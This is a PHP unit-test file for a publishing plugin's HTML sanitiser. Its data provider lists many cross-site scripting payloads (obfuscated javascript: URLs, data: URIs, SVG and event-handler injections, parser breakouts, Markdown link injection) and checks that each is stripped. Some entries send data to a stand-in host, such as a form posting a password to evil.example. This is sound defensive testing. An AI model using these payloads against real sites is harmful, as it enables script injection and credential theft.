<?php
/**
 * Hostile input to the renderer.
 *
 * The sanitiser's DOM walk and its allowlist are the security boundary for everything this plugin
 * publishes: content_html is served to other people's software, shown in feed readers, and baked
 * into other publishers' pages. wp_kses() is not used behind it (it changes published bytes, and
 * the content hash covers them), so this suite is what stands guard.
 *
 * Every case asserts the same outcome: nothing that could execute, load or reach out survives in
 * content_html, and nothing that would become one survives in content_md either.
 *
 * @package SoapboxBlyg
 */

namespace SoapboxBlyg\Tests;

class SanitizerHostileTest extends TestCase {

	/**
	 * Tags that must never appear in output, whatever the input.
	 */
	const FORBIDDEN_TAGS = array( 'script', 'style', 'iframe', 'object', 'embed', 'svg', 'math', 'form', 'input', 'button', 'base', 'link', 'meta', 'template', 'noscript', 'textarea', 'select', 'video', 'audio', 'source', 'frame', 'frameset', 'applet', 'marquee', 'body', 'html', 'head', 'title', 'xml', 'foreignobject', 'animate', 'set', 'use', 'image', 'isindex', 'xss' );

	/**
	 * Parses output the way a browser would and reports everything dangerous in it.
	 *
	 * @return string[] Problems found.
	 */
	private function problems( string $html ): array {
		$problems = array();
		$doc      = new \DOMDocument();
		$previous = libxml_use_internal_errors( true );
		$doc->loadHTML( '<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body><div id="root">' . $html . '</div></body></html>' );
		libxml_clear_errors();
		libxml_use_internal_errors( $previous );
		$root = $doc->getElementById( 'root' );
		$this->assertNotNull( $root );

		$allowed_attributes = array(
			'a'          => array( 'href', 'title' ),
			'img'        => array( 'src', 'alt', 'width', 'height' ),
			'blockquote' => array( 'class', 'data-blyg-id', 'data-blyg-version' ),
			'span'       => array( 'class' ),
			'div'        => array( 'class' ),
		);
		foreach ( $root->getElementsByTagName( '*' ) as $element ) {
			$tag = strtolower( $element->nodeName );
			if ( in_array( $tag, self::FORBIDDEN_TAGS, true ) ) {
				$problems[] = "<{$tag}> element";
			}
			foreach ( iterator_to_array( $element->attributes ) as $attribute ) {
				$name  = strtolower( $attribute->nodeName );
				$value = $attribute->nodeValue;
				if ( ! in_array( $name, isset( $allowed_attributes[ $tag ] ) ? $allowed_attributes[ $tag ] : array(), true ) ) {
					$problems[] = "{$name} attribute on <{$tag}>";
				}
				if ( in_array( $name, array( 'href', 'src' ), true ) ) {
					// Strip what a browser strips before it reads the scheme.
					$scheme_part = strtolower( preg_replace( '/[\x00-\x20]+/', '', $value ) );
					$is_safe     = 0 === strpos( $scheme_part, 'http://' ) || 0 === strpos( $scheme_part, 'https://' )
						|| ( 'href' === $name && ( 0 === strpos( $scheme_part, '#' ) || 0 === strpos( $scheme_part, 'mailto:' ) || 0 === strpos( $scheme_part, 'tel:' ) ) );
					if ( ! $is_safe ) {
						$problems[] = "{$name}=\"{$value}\" on <{$tag}>";
					}
				}
				if ( 'class' === $name && ! in_array( $value, array( 'blyg-transclusion', 'blyg-tk-gen' ), true ) ) {
					$problems[] = "class=\"{$value}\"";
				}
			}
		}
		return $problems;
	}

	/**
	 * @dataProvider hostile_inputs
	 */
	public function test_nothing_executable_survives( string $input, array $must_not_contain = array(), array $must_contain = array() ) {
		$rendered = soapbox_blyg_render_html( $input, 'Title', array( 'base' => 'https://example.org/post/' ) );
		$html     = $rendered['content_html'];

		$this->assertSame( array(), $this->problems( $html ), "content_html: {$html}" );

		// And on the raw bytes: these never legitimately appear in output as markup. Handlers, schemes
		// and attribute names are judged above on the parsed document, where a quoted string that
		// merely contains "onerror=" is correctly not an attribute.
		foreach ( array_merge( array( '<script', '<iframe', '<svg', '<math', '<object', '<embed', '<style', '<base', '<form', 'srcdoc=', 'srcset=', 'formaction=' ), $must_not_contain ) as $needle ) {
			$this->assertStringNotContainsStringIgnoringCase( $needle, $html );
		}
		foreach ( $must_contain as $needle ) {
			$this->assertStringContainsString( $needle, $html );
		}

		// The Markdown is rendered by other people's software. No raw HTML tag may reach it, and no
		// Markdown link or image may point anywhere but http(s), a fragment, mailto: or tel:.
		$md = $rendered['content_md'];
		$this->assertDoesNotMatchRegularExpression( '/<\s*\/?\s*(script|iframe|svg|math|object|embed|style|base|form|img|a|p|div)\b/i', $md, "content_md: {$md}" );
		// A quoted title is text; with its quotes escaped it cannot end early, so it is set aside first.
		$outside_titles = preg_replace( '/ "(?:\\\\.|[^"\\\\])*"\)/', ')', $md );
		preg_match_all( '/(?<!\\\\)\]\(\s*<?([^)\s>]*)/', $outside_titles, $targets );
		foreach ( $targets[1] as $target ) {
			$this->assertMatchesRegularExpression( '~^(https?://|#|mailto:|tel:)~i', $target, "content_md link target in: {$md}" );
		}
		foreach ( $rendered['media'] as $media ) {
			$this->assertMatchesRegularExpression( '#^https?://#', $media['url'] );
		}

		// Rendering what was rendered changes nothing dangerous back in: the output is a fixed point for safety.
		$this->assertSame( array(), $this->problems( soapbox_blyg_render_html( $html, 'Title', array( 'base' => 'https://example.org/post/' ) )['content_html'] ) );
	}

	public function hostile_inputs(): array {
		return array(
			// Script URLs in href, in the spellings browsers accept.
			'javascript: href'                        => array( '<a href="javascript:alert(1)">x</a>', array(), array( 'x' ) ),
			'mixed-case javascript:'                  => array( '<a href="JaVaScRiPt:alert(1)">x</a>' ),
			'leading spaces'                          => array( '<a href="   javascript:alert(1)">x</a>' ),
			'leading control characters'              => array( "<a href=\"\x01\x02javascript:alert(1)\">x</a>" ),
			'tab inside the scheme'                   => array( "<a href=\"java\tscript:alert(1)\">x</a>" ),
			'newline inside the scheme'               => array( "<a href=\"java\nscript:alert(1)\">x</a>" ),
			'carriage return inside the scheme'       => array( "<a href=\"java\rscript:alert(1)\">x</a>" ),
			'entity-encoded colon'                    => array( '<a href="javascript&#58;alert(1)">x</a>' ),
			'hex entity-encoded scheme'               => array( '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">x</a>' ),
			'decimal entities without semicolons'     => array( '<a href="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58alert(1)">x</a>' ),
			'named entity for the colon'              => array( '<a href="javascript&colon;alert(1)">x</a>' ),
			'entity-encoded tab in the scheme'        => array( '<a href="jav&#x09;ascript:alert(1)">x</a>' ),
			'vbscript:'                               => array( '<a href="vbscript:msgbox(1)">x</a>' ),
			'livescript: and other schemes'           => array( '<a href="livescript:x">a</a><a href="file:///etc/passwd">b</a><a href="ftp://example.org/">c</a><a href="blob:https://example.org/x">d</a>' ),
			'javascript: in an image src'             => array( '<img src="javascript:alert(1)" alt="x">' ),
			'javascript: hidden behind a relative path' => array( '<a href="/redirect?to=javascript:alert(1)">x</a>', array(), array( 'href="https://example.org/redirect?to=javascript:alert(1)"' ) ),

			// data: URIs.
			'data: href'                              => array( '<a href="data:text/html,<script>alert(1)</script>">x</a>' ),
			'data: base64 href'                       => array( '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>' ),
			'data: image src'                         => array( '<img src="data:image/svg+xml,<svg onload=alert(1)>" alt="">' ),
			'mixed-case data:'                        => array( '<img src="DaTa:image/png;base64,AAAA" alt="">' ),

			// SVG and MathML.
			'svg onload'                              => array( '<svg onload="alert(1)"><circle r="1"/></svg>' ),
			'svg script'                              => array( '<svg><script>alert(1)</script></svg>' ),
			'svg animate href'                        => array( '<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text>x</text></a></svg>' ),
			'svg foreignObject'                       => array( '<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>' ),
			'svg use'                                 => array( '<svg><use href="data:image/svg+xml,<svg id=x onload=alert(1)>#x"/></svg>' ),
			'math with handlers'                      => array( '<math><mi xlink:href="javascript:alert(1)" onclick="alert(1)">x</mi></math>' ),
			'math maction'                            => array( '<math><maction actiontype="statusline#http://evil.example" xlink:href="javascript:alert(1)">x</maction></math>' ),

			// Event handlers on allowed tags.
			'onclick on a paragraph'                  => array( '<p onclick="alert(1)">text</p>', array(), array( '<p>text</p>' ) ),
			'onerror on an image'                     => array( '<img src="/x.png" onerror="alert(1)" alt="a">', array(), array( '<img src="https://example.org/x.png" alt="a">' ) ),
			'onmouseover on a link'                   => array( '<a href="/y" onmouseover="alert(1)">y</a>', array(), array( '<a href="https://example.org/y">y</a>' ) ),
			'onfocus with autofocus'                  => array( '<a href="/y" onfocus="alert(1)" autofocus tabindex="0">y</a>' ),
			'handler with odd spacing and case'       => array( '<p ONCLICK = alert(1) OnMouseOver=alert(2)>text</p>' ),
			'handler on a table cell'                 => array( '<table><tr><td onpointerenter="alert(1)">c</td></tr></table>' ),
			'handler on a blockquote wire token'      => array( '<blockquote class="blyg-transclusion" data-blyg-id="7c9wk2mhq0v3xj8tn5rzfd41bg" data-blyg-version="1" onclick="alert(1)"><p>q</p></blockquote>' ),
			'attribute injection through the wire token' => array( '<blockquote class="blyg-transclusion" data-blyg-id="7c9wk2mhq0v3xj8tn5rzfd41bg&quot; onclick=&quot;alert(1)" data-blyg-version="1"><p>q</p></blockquote>' ),
			'attribute injection through alt'         => array( '<img src="/x.png" alt="a&quot; onerror=&quot;alert(1)">' ),
			'attribute injection through title'       => array( '<a href="/y" title="t&quot; onmouseover=&quot;alert(1)">y</a>' ),
			'attribute injection through href'        => array( '<a href="/y&quot; onmouseover=&quot;alert(1)">y</a>' ),
			'attribute injection through width'       => array( '<img src="/x.png" alt="" width="1&quot; onload=&quot;alert(1)" height="expression(alert(1))">' ),

			// Style.
			'style with expression()'                 => array( '<p style="width: expression(alert(1))">text</p>' ),
			'style with url(javascript:)'             => array( '<p style="background:url(javascript:alert(1))">text</p>' ),
			'style with -moz-binding'                 => array( '<div style="-moz-binding:url(https://evil.example/x.xml#x)">text</div>' ),
			'style element'                           => array( '<style>body{background:url("javascript:alert(1)")}</style><p>text</p>', array( 'background' ) ),
			'style element with an import'            => array( '<style>@import "https://evil.example/x.css";</style><p>text</p>', array( 'evil.example' ) ),

			// Attributes that load or submit.
			'srcset'                                  => array( '<img src="/x.png" srcset="javascript:alert(1) 1x, https://evil.example/t.gif 2x" alt="">', array( 'evil.example' ) ),
			'formaction'                              => array( '<form><button formaction="javascript:alert(1)">go</button></form><p>after</p>', array( 'go' ) ),
			'form posting elsewhere'                  => array( '<form action="https://evil.example/collect"><input name="password"><input type="submit"></form>', array( 'evil.example' ) ),
			'ping, background and poster'             => array( '<a href="/y" ping="https://evil.example/p">y</a><table background="javascript:alert(1)"><tr><td>c</td></tr></table><video poster="javascript:alert(1)"></video>', array( 'evil.example' ) ),
			'link and meta refresh'                   => array( '<link rel="stylesheet" href="https://evil.example/x.css"><meta http-equiv="refresh" content="0;url=javascript:alert(1)"><p>text</p>', array( 'evil.example', 'refresh' ) ),

			// Embedding.
			'iframe srcdoc'                           => array( '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>' ),
			'iframe with a script URL'                => array( '<iframe src="javascript:alert(1)"></iframe>' ),
			'iframe with a data URL'                  => array( '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>' ),
			'object'                                  => array( '<object data="javascript:alert(1)"><param name="movie" value="https://evil.example/x.swf"></object>', array( 'evil.example' ) ),
			'embed'                                   => array( '<embed src="https://evil.example/x.swf" type="application/x-shockwave-flash">', array( 'evil.example' ) ),
			'applet and frameset'                     => array( '<applet code="X.class"></applet><frameset><frame src="javascript:alert(1)"></frameset>' ),

			// Base.
			'base href'                               => array( '<base href="https://evil.example/"><a href="relative">x</a><img src="pic.png" alt="">', array( 'evil.example' ), array( 'href="https://example.org/post/relative"', 'src="https://example.org/post/pic.png"' ) ),
			'base with a script URL'                  => array( '<base href="javascript:alert(1)//"><a href="x">x</a>' ),

			// Comments, CDATA and parser tricks.
			'script in a comment'                     => array( '<!-- <script>alert(1)</script> --><p>text</p>', array( 'alert' ) ),
			'conditional comment'                     => array( '<!--[if lt IE 9]><script>alert(1)</script><![endif]--><p>text</p>', array( 'alert' ) ),
			'comment closed early'                    => array( '<!--><script>alert(1)</script>--><p>text</p>', array( 'alert' ) ),
			'comment with a fake end'                 => array( '<!-- --!><script>alert(1)</script><p>text</p>' ),
			'CDATA section'                           => array( '<![CDATA[<script>alert(1)</script>]]><p>text</p>' ),
			'nested script tag'                       => array( '<scr<script>ipt>alert(1)</scr</script>ipt><p>text</p>' ),
			'script split across a tag'               => array( '<scr<b></b>ipt>alert(1)</scr<b></b>ipt>' ),
			'unclosed script'                         => array( '<p>before</p><script>alert(1)', array( 'alert' ), array( 'before' ) ),
			'unclosed tag hiding a script'            => array( '<p>before<a href="/y" title="</p><script>alert(1)</script>">link</a>' ),
			'unclosed attribute'                      => array( '<img src="/x.png" alt="<script>alert(1)</script>' ),
			'script after an unclosed comment'        => array( '<p>text</p><!-- <script>alert(1)</script>' ),
			'null byte in a tag name'                 => array( "<scr\x00ipt>alert(1)</scr\x00ipt><p>text</p>" ),
			'slash-separated attributes'              => array( '<img/src="/x.png"/onerror="alert(1)"/alt="a">' ),
			'processing instruction'                  => array( '<?xml-stylesheet href="javascript:alert(1)"?><p>text</p>' ),
			'noscript breakout'                       => array( '<noscript><p title="</noscript><img src=x onerror=alert(1)>">x</p></noscript>' ),
			'template and textarea breakout'          => array( '<template><script>alert(1)</script></template><textarea></textarea><script>alert(2)</script><p>text</p>', array( 'alert' ) ),
			'title and xmp breakout'                  => array( '<title></title><img src=x onerror=alert(1)><xmp><script>alert(1)</script></xmp>' ),
			'entity-encoded tags stay text'           => array( '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>', array(), array( '&lt;script&gt;alert(1)&lt;/script&gt;' ) ),
			'double-encoded tags stay text'           => array( '<p>&amp;lt;script&amp;gt;</p>', array(), array( '&amp;lt;script&amp;gt;' ) ),
			'invalid utf-8 around a tag'              => array( "<p>a\xC0\xBCscript\xC0\xBEalert(1)</p>" ),

			// Markdown has syntax of its own, and alt text and titles are free text.
			'markdown link injected through alt'      => array( '<img src="/x.png" alt="x](javascript:alert(1)) [y">' ),
			'markdown injected through alt with a backslash' => array( '<img src="/x.png" alt="x\\](javascript:alert(1)) [y">' ),
			'markdown image title breakout'           => array( '<img src="/x.png" alt="a" title="t&quot;) [x](javascript:alert(1)) (&quot;">' ),
			'markdown link title breakout'            => array( '<a href="/y" title="t&quot;) [x](javascript:alert(1)) (&quot;">y</a>' ),
			'html in alt text'                        => array( '<img src="/x.png" alt="&lt;script&gt;alert(1)&lt;/script&gt;">' ),
			'html in a link title'                    => array( '<a href="/y" title="&lt;img src=x onerror=alert(1)&gt;">y</a>' ),
			'markdown link injected through link text' => array( '<a href="/y">x](javascript:alert(1)) [z</a>' ),
			'markdown injected through plain text'    => array( '<p>[x](javascript:alert(1)) ![y](javascript:alert(2)) &lt;javascript:alert(3)&gt;</p>' ),

			// The generated-content and transclusion tokens cannot be used to smuggle anything.
			'class smuggling beside a wire token'     => array( '<span class="blyg-tk-gen evil" style="position:fixed" onclick="alert(1)">g</span>', array( 'evil' ), array( '<span class="blyg-tk-gen">g</span>' ) ),
			'a div with a wire token and a script'    => array( '<div class="blyg-tk-gen"><script>alert(1)</script><p>g</p></div>', array( 'alert' ), array( '<div class="blyg-tk-gen"><p>g</p></div>' ) ),
		);
	}

	public function test_the_title_is_escaped_in_both_forms() {
		$rendered = soapbox_blyg_render_html( '<p>x</p>', '<script>alert(1)</script><img src=x onerror=alert(1)> "T" & <b>co</b>' );
		$this->assertSame( array(), $this->problems( $rendered['content_html'] ) );
		$this->assertStringStartsWith( '<h1>"T" &amp; co</h1>', $rendered['content_html'], 'a script in a title goes, contents and all' );
		$this->assertStringStartsWith( "# \"T\" & co\n", $rendered['content_md'] );
	}

	public function test_the_withdrawn_and_origin_pages_escape_what_an_origin_supplies() {
		soapbox_blyg_register_origin(
			'hostile',
			array(
				'path'        => '/hostile/',
				'layout'      => 'fixed',
				'title'       => '</title><script>alert(1)</script>',
				'description' => '<img src=x onerror=alert(1)>',
			)
		);
		$plugin = \SoapboxBlyg\Plugin::instance();
		$page   = $plugin->router->respond( $plugin->registry->get( 'hostile' ), '' )['body'];
		$this->assertStringNotContainsString( '<script>alert(1)</script>', $page );
		$this->assertStringNotContainsString( '<img src=x', $page );
		$this->assertStringContainsString( '&lt;script&gt;alert(1)&lt;/script&gt;', $page );

		// The same strings are safe in the feed and the manifest, each escaped for its own format.
		$feed = $plugin->documents->feed( $plugin->registry->get( 'hostile' ) )[0];
		$this->assertNotFalse( simplexml_load_string( $feed ), 'the feed is still well-formed XML' );
		$this->assertSame( '</title><script>alert(1)</script>', json_decode( $plugin->documents->manifest( $plugin->registry->get( 'hostile' ) )[0], true )['title'] );
	}

	public function test_content_cannot_break_out_of_the_feeds_cdata() {
		$this->register_notes();
		soapbox_blyg_publish( 'notes', 'a', $this->fragment( 'x', array( 'content_html' => '<p>]]><script>alert(1)</script><![CDATA[</p>' ) ) );
		$plugin = \SoapboxBlyg\Plugin::instance();
		$xml    = simplexml_load_string( $plugin->documents->feed( $plugin->registry->get( 'notes' ) )[0] );
		$this->assertNotFalse( $xml );
		$this->assertSame( '<p>]]><script>alert(1)</script><![CDATA[</p>', (string) $xml->channel->item[0]->description, 'the description is exactly what was stored, as character data' );
		$this->assertCount( 0, $xml->channel->item[0]->description->children(), 'and none of it became markup in the feed' );
	}
}
